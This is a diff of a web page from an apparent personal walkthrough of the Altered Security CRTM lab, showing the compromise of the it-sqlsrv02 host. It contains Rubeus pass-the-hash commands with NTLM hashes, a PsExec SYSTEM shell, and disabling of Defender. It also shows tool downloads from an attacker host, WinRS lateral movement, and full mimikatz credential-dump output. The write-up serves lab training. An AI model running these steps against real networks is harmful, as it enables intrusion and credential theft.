@@ -26,12 +26,12 @@
 
 
 <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>CRTM Walkthrough Global Central Bank | The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security</title>
+<title>CRTM Walkthrough Global Central Bank | This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity</title>
 <meta name="generator" content="Jekyll v4.3.2" />
 <meta property="og:title" content="CRTM Walkthrough Global Central Bank" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security" />
-<meta property="og:description" content="The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security" />
+<meta name="description" content="This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity" />
+<meta property="og:description" content="This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity" />
 <link rel="canonical" href="http://localhost:4000/it-sqlsrv02.html" />
 <meta property="og:url" content="http://localhost:4000/it-sqlsrv02.html" />
 <meta property="og:site_name" content="CRTM Walkthrough Global Central Bank" />
@@ -39,7 +39,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="CRTM Walkthrough Global Central Bank" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebPage","description":"The webpage it’s based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security","headline":"CRTM Walkthrough Global Central Bank","url":"http://localhost:4000/it-sqlsrv02.html"}</script>
+{"@context":"https://schema.org","@type":"WebPage","description":"This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity","headline":"CRTM Walkthrough Global Central Bank","url":"http://localhost:4000/it-sqlsrv02.html"}</script>
 <!-- End Jekyll SEO tag -->
 
   </head>
@@ -51,7 +51,7 @@
         <a id="a-title" href="/">
           <h1>CRTM Walkthrough Global Central Bank</h1>
         </a>
-        <h2>The webpage it's based on my personal solution related with the cybersecurity Certification Certified Red Team Master (GCB) of Altered Security</h2>
+        <h2>This blog based on my personal solution of the cybersecurity Certification [Certified Red Team Master (GCB)] of AlteredSecurity</h2>
 
         <section id="downloads">
           
@@ -65,14 +65,435 @@
 
     <div class="container">
       <section id="main_content">
-        <p>Enumerate doamin and find an explicit group that could be added to ITemployee15</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+        <h2 id="it-sqlsrv02-192168451">it-sqlsrv02: 192.168.4.51</h2>
 
-<p>Detect LAPS privileges on domain Extract Local administrator credentials</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+<p>Impersonate user with NTLM credentials for appmanager from employee15 machine:</p>
 
-<p>And Access to the target machine:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools&gt; .\Rubeus.exe asktgt /user:appmanager /domain:it.gcb.local /ntlm:2c5d4678b83e5de26dc0338a0fcf6245 /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 2c5d4678b83e5de26dc0338a0fcf6245
+[*] Building AS-REQ (w/ preauth) for: 'it.gcb.local\appmanager'
+[*] Using domain controller: 192.168.4.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+      GwZrcmJ0Z3QbDGl0LmdjYi5sb2NhbA==
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/it.gcb.local
+  ServiceRealm             :  IT.GCB.LOCAL
+  UserName                 :  appmanager
+  UserRealm                :  IT.GCB.LOCAL
+  StartTime                :  7/19/2024 4:19:51 AM
+  EndTime                  :  7/19/2024 2:19:51 PM
+  RenewTill                :  7/26/2024 4:19:51 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  h5aEtIiE3XW0c8c8w+f0OQ==
+  ASREP (key)              :  2C5D4678B83E5DE26DC0338A0FCF6245
+
+
+
+</code></pre></div></div>
+<p>And access with PsExec as authority system:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\tools&gt; .\PsExec.exe \\it-appsrv01 -i -s powershell
+
+PsExec v2.43 - Execute processes remotely
+Copyright (C) 2001-2023 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&gt; whoami
+haint authority\system
+PS C:\Windows\system32&gt;
+PS C:\Windows\system32&gt; hostname
+otaeit-appsrv01
+</code></pre></div></div>
+
+<p>Disable AV and impersonate sqlsvc user with rubeus binary on target machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; Set-MpPreference -DisableRealTimeMonitoring $True
+e-prfrne-ialRaTmMntrn TrePS C:\Windows\system32&gt;
+PS C:\Windows\system32&gt; wget http://192.168.100.15:443/Rubeus.exe -OutFile C:\Rubeus.exe
+
+ C:\Rubeus.exe asktgt /user:sqlsvc /domain:it.gcb.local /ntlm:7782d820e5e5952b20b77a2240a03bbc /ptt
+:Rbu.x stt/srslv dmi:tgblcl/tm7280555b07200b pt
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 7782d820e5e5952b20b77a2240a03bbc
+[*] Building AS-REQ (w/ preauth) for: 'it.gcb.local\sqlsvc'
+[*] Using domain controller: 192.168.4.2:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFRjCCBUKgAwIBBaEDAgEWooIEXTCCBFlhggRVMIIEUaADAgEFoQ4bDElULkdDQi5MT0NBTKIhMB+g
+      AwIBAqEYMBYbBmtyYnRndBsMaXQuZ2NiLmxvY2Fso4IEFTCCBBGgAwIBEqEDAgECooIEAwSCA/9Lpbun
+      xMXhVBgk2ViT4ggmDYhqjqjNUye//+Qh4Z8knGyPooebzszdf2/5o5h/CYmCRZuTAkZhbHYXBypHuca/
+      v/ZYoYMmh0PRuGhkJgJKlfQcOjpkun9cK9qYQf0PCU0zzntKx/SxRhaHTTK7PptWia7krdwpUqgDicd7
+      Lsnedbyj1r4+rBnKWZzMTwYonDLbXq6oZ6zKsVug6R0LUH+Ydym3vwip89be0foJJaRL1B6+cb1Ahy4i
+      ultPSrcLo0mxwb4RhHobjrv/tWggOm3a1sAlAtmLXFRsM1k4qT/MK07/jJUXX6axyKAJmMUQJIVGnk6N
+      T4FP4qL+L2Pd/VrL92OoBeWe/iljeJgRCcTYuQYf9+H2onkASZTh/Za2+5n52jlGMGwjVTgu6ytPI+QT
+      PQyU82Ow1E2Nd9DCfFxyl2HX6XLWTnWCvaukn/DZrhDiR/1m7CZkNBb/ko57xPFZin9Ril3mGKCWKO0u
+      OF57bEm7Qc/vOPZYiUcXiauuKyK3VIPMjgbvPLNUYM+9mzX5DaRHU75PzOSZ5dDkJmJytvP42mtBWg/5
+      bOS92DKHcrGZ1nrcxTxC9So21tYSvVmWnpq8cSC2wKRL2kuVawRrmZvi5T7j2vUxBhEFFZKIHGMX0CDB
+      4s6Qa8WbKBsPUqXYEwOHTGisShdNOy1CywyYPkFkRfhBvJ4EPyUdA9GegM44G3H4qxKEqVqK2B95Aoii
+      JpuAZXFA8OdQBlFEEfnmTUTLWooU5LwgalUeWssC0HrImojIEz+ZgGXxQbEYYlDLy/RcmJVv8s8JnrhW
+      KrVAwK+q8DEkFyfFFpoL0AdzHLqej4SdLZxERQ+CkTyYDw84g6Lrcm6PWXquy50zX42K2SzbNK3+nitD
+      8rnR1byv5Zt8Bs9fM24VaT0cGsBZr0DciojIxLbtQ9jL/wZIi2oJJovAcDiKiqtyYkyfJvAb1Qr2GWtR
+      J6P5DYQ9zwR9oc/rKKyuNP20YZPbU/efKVTcpGn5ZiFyRbLbFEFG3G+fG8BwCU9rvPfoDAyhG8VjnsYD
+      Wu5YsrtqioqkgYOuu7ZkANORpaL5rXD/VApaQAhG0ewQrlrqX7WbqhV3DwEsX3V/SkHnJPgw53UjHonS
+      HYOi6O/gCCttdcAV9M/u+ULjMaydzTjk4XYMTuPMJtragH81swD63OMWkLUY95h5Mc1Z/O+F2nOHARGR
+      67+8A0pie8DsZ3AgEfNANralT6HPJWDx/VOQgxYs2eOmw2hpBIcZOrajKZI54Zjiu5L4kQmevEooxyTi
+      nY3XPtsDoBHzDA2pG2U2BBWSN7lWy3Q4sitZQzF+D6XzrE6CEodmr53ygU4oBAVg3aWO+eypycyWmZ+j
+      gdQwgdGgAwIBAKKByQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBATsWKkA1wNDW6swZThLG4m
+      oQ4bDElULkdDQi5MT0NBTKITMBGgAwIBAaEKMAgbBnNxbHN2Y6MHAwUAQOEAAKURGA8yMDI0MDcxOTEx
+      MjM1N1qmERgPMjAyNDA3MTkyMTIzNTdapxEYDzIwMjQwNzI2MTEyMzU3WqgOGwxJVC5HQ0IuTE9DQUyp
+      ITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGl0LmdjYi5sb2NhbA==
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/it.gcb.local
+  ServiceRealm             :  IT.GCB.LOCAL
+  UserName                 :  sqlsvc
+  UserRealm                :  IT.GCB.LOCAL
+  StartTime                :  7/19/2024 4:23:57 AM
+  EndTime                  :  7/19/2024 2:23:57 PM
+  RenewTill                :  7/26/2024 4:23:57 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  E7FipANcDQ1urMGU4SxuJg==
+  ASREP (key)              :  7782D820E5E5952B20B77A2240A03BBC
+
+
+PS C:\Windows\system32&gt; winrs.exe -r:it-sqlsrv02.it.gcb.local cmd
+Microsoft Windows [Version 10.0.17763.5458]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\sqlsvc&gt;
+C:\Users\sqlsvc&gt;whoami
+whoami
+it\sqlsvc
+
+C:\Users\sqlsvc&gt;powershell -ep bypass
+powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\sqlsvc&gt; ipconfig
+ipconfig
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::ceb5:8f46:ff32:c5b1%4
+   IPv4 Address. . . . . . . . . . . : 192.168.4.51
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.4.254
+
+</code></pre></div></div>
+
+<p>Dump credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+PS C:\Users\sqlsvc&gt;
+PS C:\Users\sqlsvc&gt; Set-MpPreference -DisableRealTimeMonitoring $True
+PS C:\Users\sqlsvc&gt; sableRealTimeMonitoring $True
+PS C:\Users\sqlsvc&gt; wget http://192.168.100.15:443/mimikatz.exe -OutFile C:\mimikatz.exe
+PS C:\Users\sqlsvc&gt; 100.15:443/mimikatz.exe -OutFile C:\mimikatz.exe
+PS C:\Users\sqlsvc&gt; C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patch" "exit"
+C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "vault::list" "vault::cred /patc? "exit"
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 93129 (00000000:00016bc9)
+Session           : Service from 0
+User Name         : SQLTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:49:06 PM
+SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 58577 (00000000:0000e4d1)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:49:03 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : IT-SQLSRV02$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:48:49 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : it-sqlsrv02$
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 25084 (00000000:000061fc)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:48:49 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 649955 (00000000:0009eae3)
+Session           : RemoteInteractive from 2
+User Name         : sqlsvc
+Domain            : IT
+Logon Server      : IT-DC
+Logon Time        : 4/28/2024 11:55:20 PM
+SID               : S-1-5-21-948911695-1962824894-4291460450-1110
+        msv :
+         [00000003] Primary
+         * Username : sqlsvc
+         * Domain   : IT
+         * NTLM     : 7782d820e5e5952b20b77a2240a03bbc
+         * SHA1     : ed6b0ef7c827052a108da19c2eb141997ad5f79e
+         * DPAPI    : bd8d45ec37c414a416f1fadf90cfe9a1
+        tspkg :
+        wdigest :
+         * Username : sqlsvc
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : sqlsvc
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 618904 (00000000:00097198)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:55:01 PM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : IT-SQLSRV02$
+         * Domain   : it.gcb.local
+         * Password : 39 ab e5 9e 66 2b e0 d6 bb 11 ed ec e1 2f 3f 1d b3 79 70 2a ab 67 d4 eb 1d 6c e2 6d 9b d1 57 ba 1b c9 87 cf ef 9b 4f 85 c6 81 4f 76 e4 89 93 bc 23 86 db d3 31 ee c1 9f 87 a4 36 5d 50 7d 1b 19 71 80 7a 5b 0a cb b8 00 7e 03 46 94 41 50 06 c5 e6 70 90 f8 86 5a 79 5f b7 8d 99 ef 67 e8 b5 16 12 8c 6e 13 83 7a 52 e4 01 df a6 c7 9f 77 d7 7e 9c e2 73 ba 95 f2 37 86 ba b1 4c 9b 1c 72 10 bd b5 47 71 91 4c ff fa 34 04 a4 ce 92 cb 52 0d 8f cc ca d1 60 bf bb 51 1e a2 ab cb c8 7d a0 79 57 0a 8e d8 1b cf bf e2 b7 18 2a ed 50 d8 fb e1 b7 49 bc c9 e0 47 ac da 7d 6b 28 04 5f f7 c0 7d 9d b3 52 87 bc 30 38 b0 2a cf 1c f3 e3 04 66 5d 3b 83 d6 af a8 4a 70 7f 58 c7 9f 61 b8 47 02 73 20 18 e4 0e 75 7b a3 94 fb 63 4b ab 23 20 2a 00 a1
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:49:03 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 23389 (00000000:00005b5d)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:48:48 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * NTLM     : 9f781139283fa1e712e9dc349f236834
+         * SHA1     : cc259915c10d19d876f891ac8133629a17747852
+         * DPAPI    : cc259915c10d19d876f891ac8133629a
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : IT-SQLSRV02$
+Domain            : IT
+Logon Server      : (null)
+Logon Time        : 4/28/2024 11:48:48 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : IT-SQLSRV02$
+         * Domain   : IT
+         * Password : (null)
+        kerberos :
+         * Username : it-sqlsrv02$
+         * Domain   : IT.GCB.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+mimikatz(commandline) # vault::list
+
+Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
+        Name       : Web Credentials
+        Path       : C:\Users\sqlsvc\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+        Items (0)
+
+Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
+        Name       : Windows Credentials
+        Path       : C:\Users\sqlsvc\AppData\Local\Microsoft\Vault
+        Items (0)
+
+mimikatz(commandline) # vault::cred /patch
+
+mimikatz(commandline) # exit
+Bye!
+</code></pre></div></div>
 
 <p><a href="./section1.html">back</a></p>
 
